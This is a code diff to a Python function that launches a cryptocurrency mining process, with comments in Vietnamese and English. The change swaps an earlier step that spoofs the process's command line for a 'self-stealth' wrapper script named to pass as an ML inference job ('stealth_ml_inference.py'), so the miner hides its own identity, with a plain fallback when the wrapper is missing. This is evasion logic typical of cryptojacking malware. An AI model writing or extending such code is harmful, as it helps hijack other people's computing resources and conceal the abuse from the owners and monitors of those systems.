@@ -477,21 +477,38 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth and cpu:
-                # **Stealth subprocess** (tiến trình con ẩn danh) - **modified for dual logging** (sửa đổi cho ghi log kép)
-                process = subprocess.Popen(
-                    mining_command,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    universal_newlines=True,
-                    bufsize=1
+                # **Self-Stealth subprocess** (tiến trình con tự ẩn danh) - sử dụng stealth wrapper
+                stealth_wrapper_path = os.path.join(
+                    os.path.dirname(os.path.abspath(__file__)),
+                    "mining_environment", "scripts", "stealth_ml_inference.py"
                 )
-                if process:
-                    # **Spoof process name** (giả mạo tên tiến trình) sau khi khởi chạy
-                    try:
-                        spoof_cmdline(process.pid, process_name)
-                        logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
-                    except Exception as e:
-                        logger.warning(f"⚠️ Không thể spoof cmdline: {e}")
+                
+                if os.path.exists(stealth_wrapper_path):
+                    # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
+                    stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
+                    logger.info(f"🔒 [SELF-STEALTH] Using stealth wrapper: {stealth_wrapper_path}")
+                    
+                    process = subprocess.Popen(
+                        stealth_command,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        universal_newlines=True,
+                        bufsize=1
+                    )
+                    if process:
+                        logger.info(f"✅ [SELF-STEALTH] Stealth process started with PID: {process.pid}")
+                        logger.info(f"🔍 [SELF-STEALTH] Process will self-rename using internal stealth manager")
+                else:
+                    # Fallback to standard subprocess nếu wrapper không tồn tại
+                    logger.warning(f"⚠️ [SELF-STEALTH] Stealth wrapper not found: {stealth_wrapper_path}")
+                    logger.warning("⚠️ [SELF-STEALTH] Falling back to standard subprocess - no stealth")
+                    process = subprocess.Popen(
+                        mining_command,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        universal_newlines=True,
+                        bufsize=1
+                    )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                 logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using namespace isolation")
